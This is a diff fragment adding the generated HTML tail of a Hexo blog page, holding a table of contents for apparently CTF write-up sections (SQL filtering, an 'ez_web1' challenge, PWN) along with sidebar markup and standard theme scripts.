class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%ABAI%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC"><span class="toc-number">8.0.3.</span> <span class="toc-text">3.叫AI写个脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%96%91%E7%82%B9%EF%BC%9A"><span class="toc-number">8.0.4.</span> <span class="toc-text">4.疑点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%A7%E7%BB%AD%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">8.0.5.</span> <span class="toc-text">5.继续测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%88%91%E7%A8%8D%E5%BE%AE%E6%9F%A5%E8%AF%A2%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%EF%BC%9A"><span class="toc-number">8.0.6.</span> <span class="toc-text">6.我稍微查询我的笔记：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%82%A8%E7%8C%9C%E6%80%8E%E4%B9%88%E7%9D%80%EF%BC%8C%E8%BF%98%E7%9C%9F%E7%BB%99%E6%88%91%E6%9F%A5%E5%87%BA%E6%9D%A5%E4%BA%86"><span class="toc-number">8.0.6.1.</span> <span class="toc-text">您猜怎么着，还真给我查出来了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A-1"><span class="toc-number">8.1.</span> <span class="toc-text">答案：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SELECT%E8%A2%AB%E8%BF%87%E6%BB%A4%E3%80%82%E3%80%82%E3%80%82%E9%9A%90%E8%97%8F%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%BF%87%E6%BB%A4"><span class="toc-number">8.1.1.</span> <span class="toc-text">SELECT被过滤。。。隐藏不显示过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%9C%81%EF%BC%9A"><span class="toc-number">8.1.2.</span> <span class="toc-text">反省：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-web1"><span class="toc-number">9.</span> <span class="toc-text">ez_web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%89%AB%E6%8F%8F%E5%BE%97%E5%88%B0%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">爆破扫描得到：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A-2"><span class="toc-number">9.2.</span> <span class="toc-text">答案：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%AF%86%E9%92%A5%EF%BC%9A"><span class="toc-number">9.2.1.</span> <span class="toc-text">读取密钥：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="toc-number">9.2.2.</span> <span class="toc-text">解法2：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">10.</span> <span class="toc-text">PWN</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
